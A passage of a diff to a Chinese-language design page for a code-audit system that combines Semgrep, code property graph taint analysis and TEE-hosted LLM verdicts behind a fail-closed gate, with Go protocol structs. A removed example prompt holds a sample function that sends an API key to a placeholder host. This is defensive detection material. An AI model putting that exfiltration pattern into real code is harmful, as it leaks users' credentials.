-              stroke="color-mix(in srgb, var(--warn) 30%, var(--line))" stroke-width="1.2" />
-            <rect x="20" y="365" width="200" height="24" rx="8" fill="color-mix(in srgb, var(--warn) 15%, var(--panel))"
-              stroke="color-mix(in srgb, var(--warn) 40%, var(--line))" stroke-width="1.2" />
-            <text x="32" y="381" font-size="11.5" font-weight="700" fill="var(--warn)">阶段 3 · File 级宏观攻击链研判</text>
-            <text x="238" y="381" font-size="11" fill="var(--muted)">（宏观文件级 · 前 80 行代码 + 规则摘要 · 独立 HTTP 请求）</text>
+            <rect x="20" y="316" width="1160" height="135" rx="10"
+              fill="color-mix(in srgb, var(--accent) 3%, transparent)"
+              stroke="color-mix(in srgb, var(--accent) 25%, var(--line))" stroke-width="1.2" />
+            <rect x="20" y="316" width="310" height="24" rx="8"
+              fill="color-mix(in srgb, var(--accent) 15%, var(--panel))"
+              stroke="color-mix(in srgb, var(--accent) 40%, var(--line))" stroke-width="1.2" />
+            <text x="32" y="332" font-size="11.5" font-weight="700" fill="var(--accent)">阶段 3 · Finding 级单点强类型验证 (TEE-TLS)</text>
 
             <!-- 阶段 4 背景 -->
-            <rect x="20" y="522" width="1120" height="125" rx="10"
+            <rect x="20" y="461" width="1160" height="115" rx="10"
+              fill="color-mix(in srgb, var(--warn) 4%, transparent)"
+              stroke="color-mix(in srgb, var(--warn) 30%, var(--line))" stroke-width="1.2" />
+            <rect x="20" y="461" width="280" height="24" rx="8" fill="color-mix(in srgb, var(--warn) 15%, var(--panel))"
+              stroke="color-mix(in srgb, var(--warn) 40%, var(--line))" stroke-width="1.2" />
+            <text x="32" y="477" font-size="11.5" font-weight="700" fill="var(--warn)">阶段 4 · File 级宏观攻击链研判 (TEE-TLS)</text>
+
+            <!-- 阶段 5 背景 -->
+            <rect x="20" y="586" width="1160" height="100" rx="10"
               fill="color-mix(in srgb, var(--panel-2) 65%, transparent)" stroke="var(--line)" stroke-width="1.2" />
-            <rect x="20" y="522" width="190" height="24" rx="8" fill="var(--panel-2)" stroke="var(--line)"
+            <rect x="20" y="586" width="240" height="24" rx="8" fill="var(--panel-2)" stroke="var(--line)"
               stroke-width="1.2" />
-            <text x="32" y="538" font-size="11.5" font-weight="700" fill="var(--muted)">阶段 4 · 综合决策与 Gate 门禁</text>
+            <text x="32" y="602" font-size="11.5" font-weight="700" fill="var(--muted)">阶段 5 · Gate 门禁与 Fail-Closed 决策</text>
 
             <!-- 角色生命线 (Lifelines) -->
-            <line x1="130" y1="58" x2="130" y2="640" stroke="var(--line)" stroke-width="1.5" stroke-dasharray="4 5" />
-            <line x1="360" y1="58" x2="360" y2="640" stroke="var(--line)" stroke-width="1.5" stroke-dasharray="4 5" />
-            <line x1="600" y1="58" x2="600" y2="640" stroke="var(--line)" stroke-width="1.5" stroke-dasharray="4 5" />
-            <line x1="860" y1="58" x2="860" y2="640" stroke="var(--line)" stroke-width="1.5" stroke-dasharray="4 5" />
-            <line x1="1050" y1="58" x2="1050" y2="640" stroke="var(--line)" stroke-width="1.5" stroke-dasharray="4 5" />
+            <line x1="100" y1="58" x2="100" y2="675" stroke="var(--line)" stroke-width="1.5" stroke-dasharray="4 5" />
+            <line x1="280" y1="58" x2="280" y2="675" stroke="var(--line)" stroke-width="1.5" stroke-dasharray="4 5" />
+            <line x1="480" y1="58" x2="480" y2="675" stroke="var(--line)" stroke-width="1.5" stroke-dasharray="4 5" />
+            <line x1="680" y1="58" x2="680" y2="675" stroke="var(--line)" stroke-width="1.5" stroke-dasharray="4 5" />
+            <line x1="910" y1="58" x2="910" y2="675" stroke="var(--line)" stroke-width="1.5" stroke-dasharray="4 5" />
+            <line x1="1100" y1="58" x2="1100" y2="675" stroke="var(--line)" stroke-width="1.5" stroke-dasharray="4 5" />
 
             <!-- 角色 Header 卡片 -->
-            <g transform="translate(55, 14)">
-              <rect width="150" height="42" rx="8" fill="var(--panel)" stroke="var(--line)" stroke-width="1.5" />
-              <text x="75" y="26" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--text)">📁
-                待审源码树</text>
+            <g transform="translate(30, 14)">
+              <rect width="140" height="42" rx="8" fill="var(--panel)" stroke="var(--line)" stroke-width="1.5" />
+              <text x="70" y="26" text-anchor="middle" font-size="12px" font-weight="700" fill="var(--text)">📁 待审源码树</text>
             </g>
-            <g transform="translate(285, 14)">
-              <rect width="150" height="42" rx="8" fill="var(--panel)" stroke="var(--line)" stroke-width="1.5" />
-              <text x="75" y="26" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--text)">⚡
-                Semgrep 引擎</text>
+            <g transform="translate(210, 14)">
+              <rect width="140" height="42" rx="8" fill="var(--panel)" stroke="var(--line)" stroke-width="1.5" />
+              <text x="70" y="26" text-anchor="middle" font-size="12px" font-weight="700" fill="var(--text)">⚡ Semgrep 扫描器</text>
             </g>
-            <g transform="translate(515, 14)">
-              <rect width="170" height="42" rx="8" fill="color-mix(in srgb, var(--accent) 12%, var(--panel))"
+            <g transform="translate(405, 14)">
+              <rect width="150" height="42" rx="8" fill="var(--panel)" stroke="var(--line)" stroke-width="1.5" />
+              <text x="75" y="26" text-anchor="middle" font-size="12px" font-weight="700" fill="var(--accent)">🕸️ CPG 分析引擎</text>
+            </g>
+            <g transform="translate(600, 14)">
+              <rect width="160" height="42" rx="8" fill="color-mix(in srgb, var(--accent) 15%, var(--panel))"
                 stroke="color-mix(in srgb, var(--accent) 60%, var(--line))" stroke-width="1.6" />
-              <text x="85" y="26" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--accent)">🔄
-                审计引擎编排器</text>
+              <text x="80" y="26" text-anchor="middle" font-size="12px" font-weight="700" fill="var(--accent)">🔄 审计编排中枢 (Go)</text>
             </g>
-            <g transform="translate(775, 14)">
-              <rect width="170" height="42" rx="8" fill="color-mix(in srgb, var(--warn) 12%, var(--panel))"
+            <g transform="translate(825, 14)">
+              <rect width="170" height="42" rx="8" fill="color-mix(in srgb, var(--warn) 15%, var(--panel))"
                 stroke="color-mix(in srgb, var(--warn) 60%, var(--line))" stroke-width="1.6" />
-              <text x="85" y="26" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--warn)">🤖 本地 LLM
-                (Ollama)</text>
+              <text x="85" y="26" text-anchor="middle" font-size="12px" font-weight="700" fill="var(--warn)">🔒 TEE-LLM 服务</text>
             </g>
-            <g transform="translate(975, 14)">
+            <g transform="translate(1025, 14)">
               <rect width="150" height="42" rx="8" fill="var(--panel)" stroke="var(--line)" stroke-width="1.5" />
-              <text x="75" y="26" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--text)">🛡️ 报告与
-                Gate 门禁</text>
+              <text x="75" y="26" text-anchor="middle" font-size="12px" font-weight="700" fill="var(--text)">🛡️ Gate 门禁报告</text>
             </g>
 
-            <!-- ===== 阶段 1：Semgrep 静态语义与污点扫描时序 ===== -->
-            <line x1="600" y1="120" x2="363" y2="120" stroke="var(--text)" stroke-width="1.8"
-              marker-end="url(#seq-arrow)" />
-            <text x="480" y="113" text-anchor="middle" font-size="11.5" fill="var(--text)">1.1 触发 Semgrep 静态扫描
-              (scan_workspace)</text>
+            <!-- ===== 阶段 1：静态初筛与快速旁路 ===== -->
+            <line x1="680" y1="112" x2="283" y2="112" stroke="var(--text)" stroke-width="1.8" marker-end="url(#seq-arrow)" />
+            <text x="480" y="105" text-anchor="middle" font-size="11px" fill="var(--text)">1.1 触发静态语义扫描 ScanDirectory</text>
 
-            <line x1="360" y1="145" x2="133" y2="145" stroke="var(--muted)" stroke-width="1.5" stroke-dasharray="3 3"
-              marker-end="url(#seq-arrow)" />
-            <text x="245" y="139" text-anchor="middle" font-size="11" fill="var(--muted)">1.2 AST 符号归一化与污点追踪</text>
+            <line x1="280" y1="134" x2="103" y2="134" stroke="var(--muted)" stroke-width="1.5" stroke-dasharray="3 3" marker-end="url(#seq-arrow)" />
+            <text x="190" y="128" text-anchor="middle" font-size="10.5px" fill="var(--muted)">1.2 AST 模式匹配与语法过滤</text>
 
-            <line x1="360" y1="172" x2="597" y2="172" stroke="var(--text)" stroke-width="1.8"
-              marker-end="url(#seq-arrow)" />
-            <text x="480" y="165" text-anchor="middle" font-size="11.5" font-weight="600" fill="var(--text)">1.3 产出结构化 Finding
-              (含 AST 作用域代码块与污点链路)</text>
+            <line x1="280" y1="156" x2="677" y2="156" stroke="var(--text)" stroke-width="1.8" marker-end="url(#seq-arrow)" />
+            <text x="480" y="149" text-anchor="middle" font-size="11px" font-weight="600" fill="var(--text)">1.3 返回初始 Findings (若无发现则 50% 样本直接旁路放行)</text>
 
-            <!-- ===== 阶段 2：Finding 级单点推理 (逐条独立请求) ===== -->
-            <path d="M 600 242 L 645 242 L 645 258 L 603 258" fill="none" stroke="var(--accent)" stroke-width="1.5"
-              marker-end="url(#seq-arrow-accent)" />
-            <text x="652" y="253" font-size="11" font-weight="600" fill="var(--accent)">循环遍历每个 Finding [1..N]</text>
+            <path d="M 680 168 L 1097 168" stroke="var(--ok)" stroke-width="1.8" stroke-dasharray="4 4" marker-end="url(#seq-arrow-success)" />
+            <text x="890" y="163" text-anchor="middle" font-size="10.5px" fill="var(--ok); font-weight: 700;">[0 命中快速旁路] 准予放行 Passed: true (0 Token)</text>
 
-            <line x1="600" y1="280" x2="857" y2="280" stroke="var(--accent)" stroke-width="2"
-              marker-end="url(#seq-arrow-accent)" />
-            <text x="730" y="273" text-anchor="middle" font-size="11.5" font-weight="700" fill="var(--accent)">2.1 POST
-              /api/generate (Finding Prompt 独立请求)</text>
-            <text x="730" y="295" text-anchor="middle" font-size="10.5" fill="var(--muted)">[AST 闭包代码块 + 污点跳变链路 Trace + 命中规则 ID
-              / 跨语言签名]</text>
+            <!-- ===== 阶段 2：CPG 图构建与微服务跨界穿透 ===== -->
+            <line x1="680" y1="230" x2="483" y2="230" stroke="var(--accent)" stroke-width="1.8" marker-end="url(#seq-arrow-accent)" />
+            <text x="580" y="223" text-anchor="middle" font-size="11px" fill="var(--accent)">2.1 构建工作区 CPG (AST+CFG+DFG+CallGraph)</text>
 
-            <line x1="860" y1="326" x2="603" y2="326" stroke="var(--accent)" stroke-width="1.8" stroke-dasharray="4 4"
-              marker-end="url(#seq-arrow-accent)" />
-            <text x="730" y="318" text-anchor="middle" font-size="11.5" font-weight="600" fill="var(--accent)">2.2
-              返回单点判定 JSON: {"verdict": "BENIGN/MALICIOUS", "reason": "..."}</text>
-            <text x="730" y="340" text-anchor="middle" font-size="10.5" fill="var(--muted)">编排器写入
-              finding.llm_verdict，排除局部误报点</text>
+            <path d="M 480 248 L 520 248 L 520 262 L 483 262" fill="none" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#seq-arrow-accent)" />
+            <text x="528" y="258" font-size="10px" fill="var(--accent)">2.2 微服务路由端点匹配与 Worklist 污点传播 (max_hops=50)</text>
 
-            <!-- ===== 阶段 3：File 级攻击链研判 (按文件独立请求) ===== -->
-            <path d="M 600 400 L 645 400 L 645 416 L 603 416" fill="none" stroke="var(--warn)" stroke-width="1.5"
-              marker-end="url(#seq-arrow-warn)" />
-            <text x="652" y="411" font-size="11" font-weight="600" fill="var(--warn)">按文件分组汇总 group_by_file</text>
+            <line x1="480" y1="285" x2="677" y2="285" stroke="var(--accent)" stroke-width="1.8" marker-end="url(#seq-arrow-accent)" />
+            <text x="580" y="278" text-anchor="middle" font-size="11px" font-weight="600" fill="var(--accent)">2.3 注入 taint_trace 证据并合成跨服务反弹后门 Finding</text>
 
-            <line x1="600" y1="438" x2="857" y2="438" stroke="var(--warn)" stroke-width="2"
-              marker-end="url(#seq-arrow-warn)" />
-            <text x="730" y="431" text-anchor="middle" font-size="11.5" font-weight="700" fill="var(--warn)">3.1 POST
-              /api/generate (File Prompt 独立请求)</text>
-            <text x="730" y="453" text-anchor="middle" font-size="10.5" fill="var(--muted)">[文件前 80 行代码 + 命中的规则摘要
-              CMD_001, EXF_001...]</text>
+            <!-- ===== 阶段 3：Finding 级单点强类型验证 (TEE-TLS) ===== -->
+            <path d="M 680 346 L 715 346 L 715 360 L 683 360" fill="none" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#seq-arrow-accent)" />
+            <text x="722" y="356" font-size="10.5px" font-weight="600" fill="var(--accent)">遍历疑点 [1..N]</text>
 
-            <line x1="860" y1="484" x2="603" y2="484" stroke="var(--warn)" stroke-width="1.8" stroke-dasharray="4 4"
-              marker-end="url(#seq-arrow-warn)" />
-            <text x="730" y="476" text-anchor="middle" font-size="11.5" font-weight="600" fill="var(--warn)">3.2
-              返回文件级攻击链 JSON: {"risk_level": "HIGH", "chained": true, "exfiltration": true}</text>
-            <text x="730" y="498" text-anchor="middle" font-size="10.5" fill="var(--muted)">编排器写入
-              file_summaries[file]，记录跨行协同攻击特征</text>
+            <line x1="680" y1="382" x2="907" y2="382" stroke="var(--accent)" stroke-width="2" marker-end="url(#seq-arrow-accent)" />
+            <text x="795" y="374" text-anchor="middle" font-size="11px" font-weight="700" fill="var(--accent)">3.1 TEE-TLS: VerifyFinding(teellm.RequestEnvelope)</text>
+            <text x="795" y="396" text-anchor="middle" font-size="10px" fill="var(--muted)">[Payload: RuleID, Severity, ContextBefore(代码切片), ContextAfter(CPG 因果树)]</text>
 
-            <!-- ===== 阶段 4：综合决策与 Gate 门禁 ===== -->
-            <line x1="600" y1="565" x2="1047" y2="565" stroke="var(--text)" stroke-width="1.8"
-              marker-end="url(#seq-arrow)" />
-            <text x="825" y="557" text-anchor="middle" font-size="11.5" font-weight="600" fill="var(--text)">4.1 汇聚双级结论
-              generate_audit_report(findings, file_summaries)</text>
+            <line x1="910" y1="424" x2="683" y2="424" stroke="var(--accent)" stroke-width="1.8" stroke-dasharray="4 4" marker-end="url(#seq-arrow-accent)" />
+            <text x="795" y="416" text-anchor="middle" font-size="11px" font-weight="600" fill="var(--accent)">3.2 返回 teellm.ResponseEnvelope: DecisionResult{verdict, explanation, riskLevel}</text>
+            <text x="795" y="438" text-anchor="middle" font-size="10px" fill="var(--muted)">编排器写入 finding.LLMVerdict/Reason，实现 BENIGN 降级或 MALICIOUS 确证</text>
 
-            <path d="M 1050 585 L 1095 585 L 1095 601 L 1053 601" fill="none" stroke="currentColor" stroke-width="1.5"
-              marker-end="url(#seq-arrow)" />
-            <text x="1102" y="596" font-size="10.5" font-weight="600" fill="var(--text)">计算 Gate 门禁策略</text>
+            <!-- ===== 阶段 4：File 级宏观攻击链研判 (TEE-TLS) ===== -->
+            <line x1="680" y1="492" x2="907" y2="492" stroke="var(--warn)" stroke-width="2" marker-end="url(#seq-arrow-warn)" />
+            <text x="795" y="484" text-anchor="middle" font-size="11px" font-weight="700" fill="var(--warn)">4.1 TEE-TLS: AnalyzeFile(fileAnalysisPromptTemplate)</text>
+            <text x="795" y="504" text-anchor="middle" font-size="10px" fill="var(--muted)">[前 80 行带截断源码 + 命中的规则摘要 CMD_001, EXF_001...]</text>
 
-            <line x1="1050" y1="620" x2="603" y2="620" stroke="var(--success)" stroke-width="2" stroke-dasharray="5 4"
-              marker-end="url(#seq-arrow-success)" />
-            <text x="825" y="613" text-anchor="middle" font-size="11.5" font-weight="700" fill="var(--success)">4.2 输出
-              audit_report.json 最终审计报告 (passed: true/false 阻断决策)</text>
+            <line x1="910" y1="540" x2="683" y2="540" stroke="var(--warn)" stroke-width="1.8" stroke-dasharray="4 4" marker-end="url(#seq-arrow-warn)" />
+            <text x="795" y="532" text-anchor="middle" font-size="11px" font-weight="600" fill="var(--warn)">4.2 返回 JSON: {"risk_level":"HIGH", "summary":"...", "chained":true, "exfiltration":true}</text>
+            <text x="795" y="552" text-anchor="middle" font-size="10px" fill="var(--muted)">写入 fileReport，识别分段编码、隐写外传等多步骤攻击链</text>
+
+            <!-- ===== 阶段 5：Gate 门禁与 Fail-Closed 决策 ===== -->
+            <line x1="680" y1="624" x2="1097" y2="624" stroke="var(--text)" stroke-width="1.8" marker-end="url(#seq-arrow)" />
+            <text x="890" y="616" text-anchor="middle" font-size="11px" font-weight="600" fill="var(--text)">5.1 AssembleAuditReport 汇聚双级结论，执行 Gate 策略仲裁</text>
+
+            <path d="M 1100 638 L 1135 638 L 1135 650 L 1103 650" fill="none" stroke="currentColor" stroke-width="1.5" marker-end="url(#seq-arrow)" />
+            <text x="1142" y="647" font-size="10px" font-weight="600" fill="var(--text)">Fail-Closed 判定底线</text>
+
+            <line x1="1100" y1="664" x2="683" y2="664" stroke="var(--ok)" stroke-width="2" stroke-dasharray="5 4" marker-end="url(#seq-arrow-success)" />
+            <text x="890" y="658" text-anchor="middle" font-size="11px" font-weight="700" fill="var(--ok)">5.2 输出最终综合报告 audit_report.json (Passed: true / false)</text>
           </svg>
 
           <!-- 核心时序机制解构说明卡片 -->
           <div class="sequence-summary-callout">
             <div class="seq-summary-card">
-              <span class="seq-summary-title">⚡ 时序解耦，非合并打包</span>
-              <p class="seq-summary-desc">Finding 级与 File 级 Prompt 属于完全独立的推理会话，分别承载“单点误报过滤”与“多点复合攻击链研判”，绝不同步混合拼包。</p>
+              <span class="seq-summary-title">⚡ 50% 快速旁路与零能耗放行</span>
+              <p class="seq-summary-desc">静态规则对 50% 无害代码实现零命中直接准入，不消耗任何 TEE 算力；仅将疑点及跨模块 CPG 证据递交大模型仲裁。</p>
             </div>
             <div class="seq-summary-card">
-              <span class="seq-summary-title">🔍 逐点微观验证（AST 闭包切片）</span>
-              <p class="seq-summary-desc">每个静态命中的 Finding 触发一次独立 HTTP 调用，上下文采用 AST 作用域感知闭包切片 (AST Enclosing Scope Slicing) + 跨行污点因果链 (Source → Propagator → Sink)，避免小模型注意力分散并保障函数级语义完备。</p>
+              <span class="seq-summary-title">🔒 TEE-TLS 机密传输信道</span>
+              <p class="seq-summary-desc">全流程采用硬件远程证明与 TLS 双向认证通信，模型权重与源码片段均在 Enclave 内存中隔离解密，消除中间人监听与数据出域泄露。</p>
             </div>
             <div class="seq-summary-card">
-              <span class="seq-summary-title warn">🌐 宏观拓扑研判（文件级）</span>
-              <p class="seq-summary-desc">在文件内命中的所有规则被去重汇总后，单独调用 File Prompt，结合前 80 行代码判定是否存在分段窃取、编码后外传的 chained 攻击链。
-              </p>
+              <span class="seq-summary-title warn">🕸️ CPG 深度因果图精准注入</span>
+              <p class="seq-summary-desc">Finding 级 Payload 显式注入 CPG 跨模块污点演进树与 AST 闭包代码切片，将复杂调用压缩至 300 Token，赋予端侧模型极高判别力。</p>
             </div>
             <div class="seq-summary-card">
-              <span class="seq-summary-title">🛡️ Fail-Closed 故障隔离</span>
-              <p class="seq-summary-desc">单点推理超时或格式解析失败仅将该 Finding 降级标为 UNCERTAIN，不会污染整体文件级攻击链评估，保证安全门禁底线不穿透。</p>
+              <span class="seq-summary-title danger">🛡️ Fail-Closed 故障安全底线</span>
+              <p class="seq-summary-desc">若发生 TEE 超时、熔断器处于 Open 状态或 JSON 提取失败，统一归入 UNCERTAIN 并触发 Gate 强制阻断，杜绝安全穿透。</p>
             </div>
           </div>
         </figure>
 
-        <div class="grid-2">
-          <div class="spec">
-            <div class="tag">Finding 级</div>
-            <h3>传给 LLM 的字段</h3>
-            <ul>
-              <li><span class="mono">file</span>：完整路径。</li>
-              <li><span class="mono">line</span>：触发规则的行号。</li>
-              <li><span class="mono">rule_id</span>、<span class="mono">category</span>、<span
-                  class="mono">description</span>：规则语义。</li>
-              <li><span class="mono">ast_enclosing_block</span>：AST 作用域感知闭包切片 (包含完整函数定义与上下文逻辑)。</li>
-              <li><span class="mono">code_snippet</span>：触发规则的关键代码片段。</li>
-              <li><span class="mono">taint_trace</span>：跨行污点因果链 (Source → Propagator → Sink 跃迁轨迹)。</li>
-            </ul>
-            <div class="codebox">你是一个代码安全审计专家。请分析以下代码片段是否存在窃取数据、外传数据或其他恶意行为。
-
-              ## AST 作用域感知闭包切片与跨行污点链
-              文件: /path/to/sample.py (第 42 行 · AST 闭包: def export_metrics)
-              ```python
-              def export_metrics(model_state):
-                  api_key = os.getenv("API_KEY")
-                  # [Taint Trajectory: Source (L12) -> Propagator (L25) -> Sink (L42)]
-                  &gt;&gt;&gt; requests.post("https://example.com/upload", json={"key": api_key})
-                  return {"status": "ok"}
-              ```
-
-              ## 触发的规则
-              规则ID: NET_001
-              类别: 网络请求
-              严重度: HIGH
-              规则说明: 检测显式 HTTP/HTTPS 传输点，用于识别外传或远端控制。
-
-              ## 请回答
-              1. verdict: MALICIOUS(恶意) / SUSPICIOUS(可疑) / BENIGN(正常) / UNCERTAIN(不确定)
-              2. reason: 一句话说明理由（中文）
-              3. risk: 如果恶意，数据会怎样被利用
-
-              请严格按以下 JSON 格式回答，不要包含其他内容:
-              {"verdict":"...","reason":"...","risk":"..."}</div>
+        <!-- 3.1 协议基础架构与通信安全信道 -->
+        <div style="margin-top: 28px;">
+          <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 12px;">
+            <span style="background: var(--accent); color: #fff; font-weight: 800; padding: 3px 9px; border-radius: 6px; font-size: 12px;">3.1 协议架构</span>
+            <h3 style="margin: 0; font-size: 17px;">协议基础架构与 TEE-TLS 通信信道</h3>
           </div>
-          <div class="spec">
-            <div class="tag">File 级</div>
-            <h3>传给 LLM 的字段</h3>
-            <ul>
-              <li><span class="mono">file</span>：文件 basename，不再需要完整路径。</li>
-              <li><span class="mono">line_count</span>：文件总行数。</li>
-              <li><span class="mono">findings_count</span>：静态命中数。</li>
-              <li><span class="mono">findings_summary</span>：去重后的规则摘要，格式如 <span class="mono">CMD_001(命令执行,HIGH)</span>。
-              </li>
-              <li><span class="mono">full_code</span>：最多前 80 行源码；超过后追加截断说明。</li>
-            </ul>
-            <div class="codebox">文件: sample.py (123 行)
-              发现 4 个可疑点: CMD_001(命令执行,HIGH), EXF_001(数据外传,HIGH)
+          <p style="font-size: 13.5px; line-height: 1.6; color: var(--text);">
+            TAA 代码审计系统与大模型推理后端采用专用的 <strong>teellm-protocol/v1</strong> 强类型协议规范，该协议严格运行于 <strong>TEE-TLS (Trusted Execution Environment TLS)</strong> 机密通道之上。客户端驱动（Go 审计引擎 <code>internal/codeaudit/verifier.go</code>）与服务端推理中枢（<code>teellm-service</code>）之间建立端到端加密通道，并通过硬件飞地（如 Intel SGX / TDX）进行远程证明（Remote Attestation），保障敏感代码在离线或多租户云环境中绝不明文落地。
+          </p>
 
-              ```python
-              前 80 行代码
-              # ... (截断，文件超过 80 行)
-              ```
-
-              严格按 JSON 回答:
-              {"risk_level":"HIGH|MEDIUM|LOW|UNCERTAIN","summary":"一句话安全结论","chained":true,"exfiltration":true}</div>
+          <div class="spec-grid" style="grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 14px; margin-top: 14px;">
+            <div class="spec" style="background: var(--panel-2); border: 1px solid var(--line); border-radius: 10px; padding: 14px;">
+              <h4 style="margin: 0 0 8px 0; font-size: 14px; color: var(--accent);">协议核心标识与版本</h4>
+              <ul style="margin: 0; padding-left: 18px; font-size: 12.5px; line-height: 1.6;">
+                <li><strong>协议版本：</strong><code>teellm-protocol/v1</code>（常量 <code>teellm.CurrentProtocolVersion</code>）。</li>
+                <li><strong>传输协议：</strong>TEE-TLS（支持 mTLS 双向认证与 Enclave 证据链校验）。</li>
+                <li><strong>编码格式：</strong>UTF-8 强类型 JSON，禁止任何自由散文包装。</li>
+              </ul>
+            </div>
+            <div class="spec" style="background: var(--panel-2); border: 1px solid var(--line); border-radius: 10px; padding: 14px;">
+              <h4 style="margin: 0 0 8px 0; font-size: 14px; color: var(--accent);">标准化操作动作空间 (Actions)</h4>
+              <ul style="margin: 0; padding-left: 18px; font-size: 12.5px; line-height: 1.6;">
+                <li><code>VERIFY_FINDING</code>：单点缺陷语义复核（Finding 级仲裁）。</li>
+                <li><code>ANALYZE_FILE</code>：单文件宏观攻击链研判（File 级攻击链）。</li>
+                <li><code>HEALTH_CHECK</code>：TEE 推理引擎存活与飞地证明心跳。</li>
+              </ul>
+            </div>
+            <div class="spec" style="background: var(--panel-2); border: 1px solid var(--line); border-radius: 10px; padding: 14px;">
+              <h4 style="margin: 0 0 8px 0; font-size: 14px; color: var(--accent);">运行治理模式 (Policy Mode)</h4>
+              <ul style="margin: 0; padding-left: 18px; font-size: 12.5px; line-height: 1.6;">
+                <li><code>gate</code>（门禁强管控）：拦截一切未被确认为 BENIGN 的 HIGH/MEDIUM 风险。</li>
+                <li><code>assist</code>（审计辅助）：大模型结论作为建议附录，不破坏静态扫描基线。</li>
+              </ul>
+            </div>
           </div>
         </div>
 
-        <div class="grid-2">
-          <div class="card">
-            <h3>输出规则</h3>
-            <h4>返回什么，失败时怎么办</h4>
-            <ul>
-              <li>Finding 级必须返回 <span class="mono">verdict / reason / risk</span>。</li>
-              <li>File 级必须返回 <span class="mono">risk_level / summary / chained / exfiltration</span>。</li>
-              <li>后端缺失时，直接返回 <span class="mono">UNCERTAIN</span>，理由写“未配置推理后端”。</li>
-              <li>模型返回无法解析时，继续返回 <span class="mono">UNCERTAIN</span>，理由保留原始错误。</li>
-              <li><strong style="color:var(--danger);">Fail-Closed 判定底线：</strong>存在高/中危告警且大模型返回 <span class="mono">UNCERTAIN</span>（或超时/解析失败）时，门禁必须维持阻断（<span class="mono">passed = false</span>），绝对杜绝安全穿透。</li>
-              <li><strong style="color:var(--warn);">File 级决策联动：</strong>若文件级分析判定 <span class="mono">chained = true</span> 或 <span class="mono">exfiltration = true</span>，直接升级全局风险并触发门禁拦截。</li>
-            </ul>
+        <!-- 3.2 Finding 级单点强类型验证契约 -->
+        <div style="margin-top: 32px;">
+          <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 12px;">
+            <span style="background: var(--accent); color: #fff; font-weight: 800; padding: 3px 9px; border-radius: 6px; font-size: 12px;">3.2 Finding 契约</span>
+            <h3 style="margin: 0; font-size: 17px;">Finding 级单点语义判定契约 (Action: VERIFY_FINDING)</h3>
           </div>
-          <div class="card">
-            <h3>解析策略</h3>
-            <h4>只接 JSON，不接散文</h4>
-            <ul>
-              <li>调用侧把温度固定到 <span class="mono">0.1</span>，减少漂移。</li>
-              <li>返回文本只做一次 JSON 提取，不做多轮猜测。</li>
-              <li>提取失败即转 <span class="mono">UNCERTAIN</span>，不允许“猜一个像样的标签”。</li>
-              <li>这就是 fail-closed 的具体实现：失败状态必须进入结果，而不是消失。</li>
-            </ul>
+          <p style="font-size: 13.5px; line-height: 1.6; color: var(--text);">
+            针对静态规则捕获的每一条安全可疑点，Go 审计编排器向 <code>teellm-service</code> 发送标准的 <code>RequestEnvelope</code>。该结构内嵌 <code>FindingPayload</code> 与 <code>CodeTarget</code>，其中 <code>ContextBefore</code> 承载多文件 AST 依赖切片代码，而 <code>ContextAfter</code> 则深度注入由 CPG 引擎提炼的 <strong>[Deep Audit Inter-Procedural Taint Trajectory]</strong> 跨模块过程间污点拓扑树。
+          </p>
+
+          <div class="spec-grid" style="grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 14px;">
+            <!-- 请求结构体定义 -->
+            <div class="card" style="background: var(--panel-2); border: 1px solid var(--line); border-radius: 12px; padding: 16px;">
+              <div class="tag" style="margin-bottom: 8px;">Go Request Struct 契约规范</div>
+              <pre class="codebox" style="margin: 0; font-size: 11.5px; max-height: 380px; overflow-y: auto;"><code>// teellm.RequestEnvelope (teellm/types.go)
+type RequestEnvelope struct {
+    ProtocolVersion string          `json:"protocolVersion"`
+    RequestID       string          `json:"requestId"`
+    TaskID          string          `json:"taskId,omitempty"`
+    Timestamp       int64           `json:"timestamp"`
+    Nonce           string          `json:"nonce"`
+    DeadlineMs      int64           `json:"deadlineMs"`
+    Auth            *AuthConfig     `json:"auth,omitempty"`
+    ModelRef        *ModelReference `json:"modelRef,omitempty"`
+    Action          string          `json:"action"` // VERIFY_FINDING
+    FindingPayload  *FindingPayload `json:"findingPayload,omitempty"`
+    Policy          PolicyOptions   `json:"policy"`
+}
+
+type FindingPayload struct {
+    RuleID      string     `json:"ruleId"`
+    Category    string     `json:"category"`
+    Severity    string     `json:"severity"`
+    Description string     `json:"description"`
+    Target      CodeTarget `json:"target"`
+}
+
+type CodeTarget struct {
+    FilePath      string `json:"filePath"`
+    Line          int    `json:"line"`
+    CodeSnippet   string `json:"codeSnippet"`
+    ContextBefore string `json:"contextBefore,omitempty"` // 跨文件切片上下文
+    ContextAfter  string `json:"contextAfter,omitempty"`  // CPG 过程间因果链
+    ContentSHA256 string `json:"contentSha256,omitempty"`
+}</code></pre>
+            </div>
+
+            <!-- 响应结构体定义 -->
+            <div class="card" style="background: var(--panel-2); border: 1px solid var(--line); border-radius: 12px; padding: 16px;">
+              <div class="tag" style="margin-bottom: 8px; background: color-mix(in srgb, var(--ok) 15%, transparent); color: var(--ok); border-color: color-mix(in srgb, var(--ok) 30%, transparent);">Go Response Struct 契约规范</div>
+              <pre class="codebox" style="margin: 0; font-size: 11.5px; max-height: 380px; overflow-y: auto;"><code>// teellm.ResponseEnvelope (teellm/types.go)
+type ResponseEnvelope struct {
+    ProtocolVersion string          `json:"protocolVersion"`
+    RequestID       string          `json:"requestId"`
+    Status          string          `json:"status"` // SUCCESS / ERROR / DEGRADED
+    ErrorMessage    string          `json:"errorMessage,omitempty"`
+    Decision        *DecisionResult `json:"decision,omitempty"`
+    Metrics         *Metrics        `json:"metrics,omitempty"`
+    EngineInfo      *EngineInfo     `json:"engineInfo,omitempty"`
+}
+
+type DecisionResult struct {
+    Verdict              string  `json:"verdict"`              // MALICIOUS/SUSPICIOUS/BENIGN/UNCERTAIN
+    Confidence           float32 `json:"confidence"`           // 0.0 ~ 1.0 置信度
+    RiskLevel            string  `json:"riskLevel"`            // CRITICAL/HIGH/MEDIUM/LOW
+    ReasonCode           string  `json:"reasonCode"`           // 机器可读原因码 (如 SENSITIVE_EXFILTRATION)
